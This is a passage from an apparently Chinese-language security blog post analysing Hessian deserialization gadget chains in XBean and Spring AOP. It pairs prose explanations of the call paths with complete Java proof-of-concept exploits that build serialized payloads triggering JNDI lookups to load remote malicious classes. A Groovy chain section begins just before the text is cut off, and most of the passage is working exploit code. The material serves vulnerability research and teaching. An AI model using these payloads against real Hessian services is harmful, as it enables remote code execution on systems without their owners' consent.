src="/2023/11/06/Hessian/1710316245276-c91babe1-93be-4f18-9305-8e320f675651.png"></p><p>接着调用org.apache.xbean.naming.context.ContextUtil#resolve方法，该方法中调用了javax.naming.spi.NamingManager#getObjectInstance方法，后面就是和Resin链的调用过程一样了，远程加载恶意字节码操作。</p><p><img src="/2023/11/06/Hessian/1710316358602-205426ce-a835-403f-b3ec-108cb41b761c.png"></p><p>在构造POC的时候需要注意两个地方，第一个是恶意类需要继承ObjectFactory接口，第二个是需要在序列化加上objectOutputStream.getSerializerFactory().setAllowNonSerializable(true)。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.ContextUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.naming.context.WritableContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XBeanGadgetOfHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;Calculator&quot;</span>, <span class="string">&quot;Calculator&quot;</span>, <span class="string">&quot;http://127.0.0.1:2333/&quot;</span>);</span><br><span class="line">        ContextUtil.<span class="type">ReadOnlyBinding</span> <span class="variable">readOnlyBinding</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContextUtil</span>.ReadOnlyBinding(<span class="string">&quot;Calculator&quot;</span>, reference, <span class="keyword">new</span> <span class="title class_">WritableContext</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>, readOnlyBinding);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>, readOnlyBinding);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(map1, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        hashMap.put(map2, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">            System.out.println(_base64);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SpringAbstractBeanFactoryPointcutAdvisor"><a href="#SpringAbstractBeanFactoryPointcutAdvisor" class="headerlink" title="SpringAbstractBeanFactoryPointcutAdvisor"></a><strong>SpringAbstractBeanFactoryPointcutAdvisor</strong></h3><p>这条利用链利用的是HashMap对比触发equals方法，核心是AbstractPointcutAdvisor和其子类AbstractBeanFactoryPointcutAdvisor。触发点在AbstractPointcutAdvisor#equals方法，对比两个AbstractPointcutAdvisor是否相同。</p><p><img src="/2023/11/06/Hessian/1710316636816-cf3d5f9b-0006-4532-b74b-4de609fe84d6.png"></p><p>跟进其子类org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor#getAdvice方法，AbstractBeanFactoryPointcutAdvisor是和BeanFactory有关的PointcutAdvisor，简单来说就是进行切片时可以使用beanFactory里面注册的实例。因此，getAdvice方法会调用其成员变量beanFactory的getBean方法获取Bean实例，结合SimpleJndiBeanFactory即可触发JNDI注入。</p><p><img src="/2023/11/06/Hessian/1710316863753-af4a8c94-4c3d-4006-9027-7fbf27724f74.png"></p><p><img src="/2023/11/06/Hessian/1710316907654-3a56a106-5e13-42a5-ba9a-d071c445a10b.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringAOPGadgetOfHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/fxqymu&quot;</span>;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">simpleJndiBeanFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        simpleJndiBeanFactory.setShareableResources(jndiUrl);</span><br><span class="line"></span><br><span class="line">        <span class="type">DefaultBeanFactoryPointcutAdvisor</span> <span class="variable">defaultBeanFactoryPointcutAdvisor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>();</span><br><span class="line">        defaultBeanFactoryPointcutAdvisor.setBeanFactory(simpleJndiBeanFactory);</span><br><span class="line">        defaultBeanFactoryPointcutAdvisor.setAdviceBeanName(jndiUrl);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>(), <span class="keyword">new</span> <span class="title class_">DefaultBeanFactoryPointcutAdvisor</span>(), <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, defaultBeanFactoryPointcutAdvisor, defaultBeanFactoryPointcutAdvisor, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(hashMap, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">            System.out.println(_base64);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="SpringPartiallyComparableAdvisorHolder"><a href="#SpringPartiallyComparableAdvisorHolder" class="headerlink" title="SpringPartiallyComparableAdvisorHolder"></a><strong>SpringPartiallyComparableAdvisorHolder</strong></h3><p>这条链的触发点在AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder#toString方法，当advisor实现了Ordered接口时，会调用advisor的getOrder方法。</p><p><img src="/2023/11/06/Hessian/1710317071323-5f656fe7-be93-45e7-9a71-926fc8fe1a2d.png"></p><p>此时，需要寻找一个同时实现了Advisor和Ordered接口的类，这里选择org.springframework.aop.aspectj.AspectJPointcutAdvisor，其getOrder方法会调用org.springframework.aop.aspectj.AbstractAspectJAdvice#getOrder方法。</p><p><img src="/2023/11/06/Hessian/1710317190815-a9b23486-95ed-4934-93d0-862817282fad.png"></p><p>跟进org.springframework.aop.aspectj.AbstractAspectJAdvice#getOrder方法，继续调用org.springframework.aop.aspectj.AspectInstanceFactory#getOrder方法，这里利用其子类org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory来完成getOrder方法的调用。接着往后的操作和SpringAbstractBeanFactoryPointcutAdvisor利用链中一样。</p><p><img src="/2023/11/06/Hessian/1710317264031-85de23fd-2436-4c62-bab4-4016b39646d8.png"></p><p><img src="/2023/11/06/Hessian/1710317331987-9ec54794-5b2e-4bbb-b08f-60c868564a09.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.hessian;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AbstractAspectJAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJAroundAdvice;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.AspectJPointcutAdvisor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.aop.aspectj.annotation.BeanFactoryAspectInstanceFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.jndi.support.SimpleJndiBeanFactory;</span><br><span class="line"><span class="keyword">import</span> sun.reflect.ReflectionFactory;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringContextAOPGadgetOfHessian</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">jndiUrl</span> <span class="operator">=</span> <span class="string">&quot;ldap://127.0.0.1:1389/fxqymu&quot;</span>;</span><br><span class="line">        <span class="type">SimpleJndiBeanFactory</span> <span class="variable">simpleJndiBeanFactory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleJndiBeanFactory</span>();</span><br><span class="line">        simpleJndiBeanFactory.setShareableResources(jndiUrl);</span><br><span class="line"></span><br><span class="line">        <span class="type">AspectInstanceFactory</span> <span class="variable">aspectInstanceFactory</span> <span class="operator">=</span> createWithoutConstructor(BeanFactoryAspectInstanceFactory.class);</span><br><span class="line">        setFieldValue(aspectInstanceFactory, <span class="string">&quot;beanFactory&quot;</span>, simpleJndiBeanFactory);</span><br><span class="line">        setFieldValue(aspectInstanceFactory, <span class="string">&quot;name&quot;</span>, jndiUrl);</span><br><span class="line"></span><br><span class="line">        <span class="type">AbstractAspectJAdvice</span> <span class="variable">abstractAspectJAdvice</span> <span class="operator">=</span> createWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        setFieldValue(abstractAspectJAdvice, <span class="string">&quot;aspectInstanceFactory&quot;</span>, aspectInstanceFactory);</span><br><span class="line"></span><br><span class="line">        <span class="type">AspectJPointcutAdvisor</span> <span class="variable">aspectJPointcutAdvisor</span> <span class="operator">=</span> createWithoutConstructor(AspectJPointcutAdvisor.class);</span><br><span class="line">        setFieldValue(aspectJPointcutAdvisor, <span class="string">&quot;advice&quot;</span>, abstractAspectJAdvice);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">partiallyComparableAdvisorHolder</span> <span class="operator">=</span> createWithoutConstructor(clazz);</span><br><span class="line">        setFieldValue(partiallyComparableAdvisorHolder, <span class="string">&quot;advisor&quot;</span>, aspectJPointcutAdvisor);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">XString</span> <span class="variable">xString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map1.put(<span class="string">&quot;aa&quot;</span>, partiallyComparableAdvisorHolder);</span><br><span class="line">        map1.put(<span class="string">&quot;bB&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;aa&quot;</span>, xString);</span><br><span class="line">        map2.put(<span class="string">&quot;bB&quot;</span>, partiallyComparableAdvisorHolder);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(map1,<span class="string">&quot;&quot;</span>);</span><br><span class="line">        hashMap.put(map2,<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">HessianOutput</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">            objectOutputStream.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">            objectOutputStream.writeObject(hashMap);</span><br><span class="line">            objectOutputStream.flush();</span><br><span class="line">            objectOutputStream.close();</span><br><span class="line">            <span class="type">String</span> <span class="variable">_base64</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">            System.out.println(_base64);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">HessianInput</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">            objectInputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125; <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@SuppressWarnings</span> ( &#123;</span><br><span class="line">            <span class="string">&quot;unchecked&quot;</span></span><br><span class="line">    &#125; )</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objConstructor = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; constructor = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objConstructor);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) constructor.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Groovy"><a href="#Groovy" class="headerlink" title="Groovy"></a>Groovy</h3><p>触发点使用TreeMap触发compareTo方法，使用ConvertedClosure生成动态代理对象，将方法调用转移至MethodClosure封装类，借用其doCall方法进一步调用ContinuationDirContext#listBindings方法触发后续的攻击流程。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 